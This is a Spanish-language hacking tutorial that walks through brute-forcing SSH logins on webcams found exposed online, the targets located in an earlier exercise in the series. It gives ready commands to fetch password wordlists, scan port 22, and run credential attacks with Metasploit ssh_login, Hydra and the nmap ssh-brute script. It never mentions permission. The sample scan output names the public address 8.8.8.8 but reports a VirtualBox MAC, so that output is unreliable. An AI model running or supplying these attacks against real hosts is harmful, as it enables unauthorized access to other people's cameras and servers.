# Fuerza Bruta SSH

Obtención de acceso a servidores **SSH** mediante fuerza bruta.

Dando seguimiento a la práctica IX donde localizamos protocolos de internet (IP) de cámaras web bajo servidores **secure shell (ssh)** de las cuales la mayoría solicitaba credenciales para su acceso. Practicaremos el método de fuerza bruta a estos servidores con un listado de palabras (**wordlist**) como credenciales de usuario/contraseña para obtener el acceso.

## Wordlists (Listado de palabras)

Sin duda los más efectivos son los personalizados, es decir, creados exclusivamente para ese servidor en particular tras una ingeniería social. Sin embargo, no siempre se tiene esa información y para esos escenarios existen diversos wordlist que contienen las credenciales más comúnmente utilizadas.

*   **rockyou**:
    ```bash
    wget https://www.scrapmaker.com/data/wordlists/dictionaries/rockyou.txt
    ```
*   **Jeanphorn**:
    ```bash
    git clone https://github.com/jeanphorn/wordlist
    ```

## Verificación del puerto

Bien una vez listo nuestro wordlist tendremos que validar que existe el puerto ssh activo y para ello utilizaremos a **nmap** bajo el siguiente comando:

```bash
nmap 8.8.8.8 -p 22
```

Salida esperada:
```text
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-03 04:58 CST
Nmap scan report for 8.8.8.8
Host is up (0.0039s latency).

PORT STATE SERVICE
22/tcp open ssh
MAC Address: 08:00:27:77:62:6C (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 13.3 seconds
```

## Métodos para realizar fuerza bruta

### 1. Metasploit-Framework

Msf cuenta con un auxiliar que realiza lo que necesitamos para esta práctica.

```bash
msf6> use auxiliary/scanner/ssh/ssh_login
```

Configuración necesaria:

*   **RHOSTS**: es la dirección IP de nuestro objetivo.
    ```bash
    msf6 (auxiliary(scanner/ssh/ssh_login) > set rhosts 8.8.8.8
    ```
*   **STOP_ON_SUCCESS**: se detendrá el ataque después de encontrar credenciales válidas.
    ```bash
    msf6 auxiliary(scanner/ssh/ssh_login) > set stop_on_success true
    ```
*   **USER_FILE**: es una lista de nombres de usuario.
    ```bash
    msf6 auxiliary(scanner/ssh/ssh_login) > set user_file users.txt
    ```
*   **PASS_FILE**: es una lista de contraseñas.
    ```bash
    msf6 auxiliary(scanner/ssh/ssh_login) > set pass_file passwords.txt
    ```
*   **VERBOSE**: que mostrará todos los intentos.
    ```bash
    msf6 auxiliary(scanner/ssh/ssh_login) > set verbose true
    ```

Ejecución:
```bash
msf6 auxiliary(scanner/ssh/ssh_login) > run
```

### 2. Hydra

Hydra contiene una variedad de opciones, pero para esta práctica usaremos las siguientes:

*   `-L`: especifica una lista de nombres de inicio de sesión.
*   `-P`: especifica una lista de contraseñas.
*   `ssh://8.8.8.8`: nuestro objetivo y protocolo.
*   `-t`: establece el número de tareas paralelas que se ejecutarán (ej. 4).

Ejecución:
```bash
hydra -L users.txt -P passwords.txt ssh://8.8.8.8 -t 4
```

### 3. Nmap

El último método implica el uso de **Nmap Scripting Engine (NSE)**: un script de nmap que intentará forzar todas las combinaciones posibles de un par de nombre de usuario y contraseña.

```bash
nmap 8.8.8.8 -p 22 --script ssh-brute --script-args userdb=users.txt,passdb=passwords.txt
```

> **Nota:** Dependiendo de la longitud del wordlist esto puede llevar algún tiempo.

> **Nota:** NO memorices aprende practicando, que la genialidad es igual a la repetición.
